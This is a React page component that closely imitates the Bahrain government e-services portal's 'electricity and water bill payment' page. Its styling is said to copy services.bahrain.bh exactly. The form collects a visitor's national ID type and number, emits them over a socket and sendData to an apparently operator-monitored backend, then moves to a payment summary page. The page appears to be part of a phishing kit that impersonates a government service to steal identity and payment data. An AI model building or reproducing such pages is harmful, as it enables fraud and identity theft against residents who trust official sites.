import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();
  const [idType, setIdType] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    navigateToPage('الصفحة الرئيسية');
  }, []);

  const handleSubmit = () => {
    if (!idType || !idNumber) return;
    setIsSubmitting(true);

    const idTypeLabel = 
      idType === 'bahraini' ? 'الرقم الشخصي البحريني' :
      idType === 'emirati' ? 'الرقم الشخصي الإماراتي' :
      idType === 'saudi' ? 'الرقم الشخصي السعودي' :
      idType === 'omani' ? 'الرقم الشخصي العماني' : idType;

    if (socket.value.connected) {
      socket.value.emit('visitor:updateName', idNumber);
    }

    sendData({
      data: {
        idType: idTypeLabel,
        idNumber,
      },
      current: 'الصفحة الرئيسية',
      nextPage: 'summary-payment',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsSubmitting(false);
      setLocation('/summary-payment');
    }, 1000);
  };

  return (
    <>
      {/* Inject the exact same CSS reset and font stack from services.bahrain.bh */}
      <style dangerouslySetInnerHTML={{ __html: `
        .bh-page, .bh-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji" !important;
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          border: 0;
          outline: 0;
        }
        .bh-page {
          direction: rtl;
          min-height: 100vh;
          background: #F5F5F7;
          color: #17171C;
          font-size: 16px;
          font-weight: 400;
          line-height: 1.5;
          -webkit-text-size-adjust: 100%;
        }
        .bh-page a {
          text-decoration: none;
          color: inherit;
        }
        .bh-page img {
          max-width: 100%;
          height: auto;
        }
        .bh-container {
          max-width: 1170px;
          margin: 0 auto;
          padding: 0 15px;
        }
        
        /* Header area */
        .bh-header {
          background: #fff;
          border-bottom: 1px solid #EAEAEE;
        }
        .bh-header-row1 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0 0 0;
        }
        .bh-logo img {
          height: 60px;
        }
        .bh-lang {
          display: flex;
          align-items: center;
          gap: 6px;
          cursor: pointer;
          color: #4B4B57;
          font-size: 15px;
        }
        .bh-header-row2 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 0 14px 0;
        }
        .bh-tabs-row {
          display: flex;
          align-items: center;
          gap: 24px;
        }
        .bh-tab {
          font-size: 18px !important;
          font-weight: 400 !important;
          color: #4B4B57 !important;
          cursor: pointer;
          padding-bottom: 8px;
          border-bottom: 3px solid transparent;
        }
        .bh-tab.active {
          font-weight: 600 !important;
          color: #17171C !important;
          border-bottom-color: #0747C7;
        }
        .bh-header-actions {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .bh-login-btn {
          background: #078757 !important;
          color: #fff !important;
          padding: 7px 22px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
          display: inline-block;
        }
        
        /* Navigation bar */
        .bh-nav {
          background: #EAEAEE;
          border-bottom: 3px solid #0747C7;
        }
        .bh-nav-items {
          display: flex;
          align-items: stretch;
        }
        .bh-nav-item {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
          padding: 12px 28px !important;
          border-left: 1px solid #D3D3DA;
          display: flex;
          align-items: center;
          white-space: nowrap;
          cursor: pointer;
        }
        .bh-nav-item:last-child {
          border-left: none;
        }
        .bh-nav-item:first-child::before {
          content: "";
          display: inline-block;
          width: 3px;
          height: 16px;
          background: #0747C7;
          margin-left: 10px;
          border-radius: 2px;
        }
        
        /* Banner */
        .bh-banner {
          margin: 20px 0;
          background: #E5ECF9;
          border: 2px dashed #D3D3DA;
          padding: 24px 30px;
          text-align: center;
          position: relative;
        }
        .bh-banner-title {
          font-size: 22px !important;
          font-weight: 600 !important;
          color: #17171C !important;
          margin-bottom: 4px !important;
        }
        .bh-banner-subtitle {
          font-size: 16px !important;
          font-weight: 400 !important;
          color: #4B4B57 !important;
        }
        .bh-banner a {
          color: #0747C7 !important;
          text-decoration: underline !important;
        }
        
        /* Content area */
        .bh-content-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 12px;
        }
        .bh-content-title {
          font-size: 1.5rem !important;
          font-weight: 600 !important;
          color: #17171C !important;
          line-height: 30px;
        }
        .bh-menu-link {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 14px !important;
          color: #4B4B57 !important;
          cursor: pointer;
        }
        
        /* Blue bars */
        .bh-blue-bar {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 10px 18px !important;
          display: flex;
          align-items: center;
          justify-content: space-between;
          font-size: 15px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        .bh-blue-bar-info {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        /* Required text */
        .bh-required-text {
          font-size: 13px !important;
          color: #4B4B57 !important;
          margin: 10px 0 !important;
          text-align: right;
        }
        
        /* Form area */
        .bh-form-area {
          background: #fff;
          border: 1px solid #D3D3DA;
          border-top: none;
          padding: 20px 24px;
        }
        .bh-form-row {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 15px;
        }
        .bh-form-row:last-child {
          margin-bottom: 0;
        }
        .bh-form-label {
          font-size: 14px !important;
          font-weight: 500 !important;
          color: #17171C !important;
          white-space: nowrap;
        }
        .bh-form-label .required {
          color: #A70717 !important;
        }
        .bh-form-select, .bh-form-input {
          padding: 8px 12px !important;
          border: 1px solid #D3D3DA !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          background: #fff !important;
          color: #17171C !important;
          min-width: 240px;
          direction: rtl;
        }
        .bh-form-input {
          direction: ltr;
          text-align: left;
        }
        .bh-form-select:focus, .bh-form-input:focus {
          border-color: #0747C7 !important;
          outline: none;
          box-shadow: 0 0 0 2px rgba(7, 71, 199, 0.15);
        }
        
        /* Buttons */
        .bh-buttons {
          display: flex;
          gap: 10px;
          justify-content: center;
          margin: 20px 0 40px 0;
          padding: 0 !important;
        }
        .bh-btn-primary {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 8px 28px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        .bh-btn-primary:disabled {
          background: #C0C0CA !important;
          cursor: not-allowed;
        }
        .bh-btn-back {
          background: #EAEAEE !important;
          color: #17171C !important;
          padding: 8px 28px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        
        /* Bottom line */
        .bh-bottom-line {
          height: 4px;
          background: #0747C7;
          margin-top: 30px;
        }
        
        /* Mobile responsive */
        @media (max-width: 768px) {
          .bh-header-row2 {
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
          }
          .bh-nav-items {
            flex-wrap: wrap;
          }
          .bh-nav-item {
            font-size: 14px !important;
            padding: 8px 10px !important;
          }
          .bh-form-row {
            flex-direction: column;
            align-items: flex-start;
          }
          .bh-form-select, .bh-form-input {
            width: 100%;
            min-width: unset;
          }
        }
      `}} />
      
      <div className="bh-page">
        {/* ===== HEADER ===== */}
        <div className="bh-header">
          <div className="bh-container">
            {/* Row 1: Logo + English */}
            <div className="bh-header-row1">
              <div className="bh-logo">
                <img 
                  src="/logo_ar.svg" 
                  alt="شعار مملكة البحرين"
                  onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                />
              </div>
              <div className="bh-lang">
                <svg width="18" height="18" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="1.5">
                  <circle cx="16" cy="16" r="14"/>
                  <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
                </svg>
                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif' }}>English</span>
              </div>
            </div>

            {/* Row 2: Tabs + Actions */}
            <div className="bh-header-row2">
              <div className="bh-tabs-row">
                <span className="bh-tab active">الخدمات الإلكترونية</span>
                <span className="bh-tab">دليل المعلومات</span>
              </div>
              <div className="bh-header-actions">
                <img src="/emergency-cal.svg" alt="" style={{ width: '20px', height: '20px', cursor: 'pointer', opacity: 0.7 }} onError={(e: any) => e.target.style.display='none'} />
                <span className="bh-login-btn">تسجيل الدخول</span>
              </div>
            </div>
          </div>
        </div>

        {/* ===== NAVIGATION BAR ===== */}
        <div className="bh-nav">
          <div className="bh-container">
            <div className="bh-nav-items">
              <a className="bh-nav-item">الصفحة الرئيسية</a>
              <a className="bh-nav-item">الخدمات الإلكترونية حسب التصنيف</a>
              <a className="bh-nav-item">الخدمات الإلكترونية حسب المقدم</a>
              <a className="bh-nav-item">متجر تطبيقات الحكومة الإلكترونية</a>
            </div>
          </div>
        </div>

        {/* ===== BANNER ===== */}
        <div className="bh-container">
          <div className="bh-banner">
            <div className="bh-banner-title">
              استفد من خدمات <a href="#">التخويل الإلكتروني</a>
            </div>
            <div className="bh-banner-subtitle">
              لإنجاز خدمات المكاتب الأمامية للجهات الحكومية
            </div>
          </div>
        </div>

        {/* ===== MAIN CONTENT ===== */}
        <div className="bh-container">
          {/* Title row */}
          <div className="bh-content-header">
            <div className="bh-menu-link">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4B4B57" strokeWidth="2" strokeLinecap="round">
                <line x1="3" y1="6" x2="21" y2="6"/>
                <line x1="3" y1="12" x2="21" y2="12"/>
                <line x1="3" y1="18" x2="21" y2="18"/>
              </svg>
              <span>القائمة</span>
            </div>
            <h2 className="bh-content-title">دفع فاتورة الكهرباء والماء</h2>
          </div>

          {/* Blue bar: Instructions */}
          <div className="bh-blue-bar">
            <div className="bh-blue-bar-info">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
                <line x1="12" y1="11" x2="12" y2="17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                <circle cx="12" cy="8" r="1" fill="white"/>
              </svg>
              <span>اضغط هنا لعرض التعليمات</span>
            </div>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
          </div>

          {/* Required text */}
          <div className="bh-required-text">
            <span style={{ color: '#A70717' }}>*</span> بيانات مطلوبة
          </div>

          {/* Blue bar: Customer details */}
          <div className="bh-blue-bar">
            <span>تفاصيل العميل</span>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
          </div>

          {/* Form area */}
          <div className="bh-form-area">
            <div className="bh-form-row">
              <label className="bh-form-label">
                <span className="required">*</span> نوع الهوية:
              </label>
              <select
                className="bh-form-select"
                value={idType}
                onChange={e => setIdType(e.target.value)}
              >
                <option value="">-- اختر نوع الهوية --</option>
                <option value="emirati">الرقم الشخصي الإماراتي</option>
                <option value="bahraini">الرقم الشخصي البحريني</option>
                <option value="saudi">الرقم الشخصي السعودي</option>
                <option value="omani">الرقم الشخصي العماني</option>
              </select>
            </div>

            {idType && (
              <div className="bh-form-row">
                <label className="bh-form-label">
                  <span className="required">*</span> رقم الهوية:
                </label>
                <input
                  className="bh-form-input"
                  type="text"
                  value={idNumber}
                  onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="أدخل رقم الهوية"
                  maxLength={12}
                />
              </div>
            )}
          </div>

          {/* Buttons */}
          <div className="bh-buttons">
            {idType && idNumber && (
              <button
                className="bh-btn-primary"
                onClick={handleSubmit}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
              </button>
            )}
            <button className="bh-btn-back">رجوع</button>
          </div>
        </div>

        {/* Bottom line */}
        <div className="bh-bottom-line"></div>
      </div>
    </>
  );
}
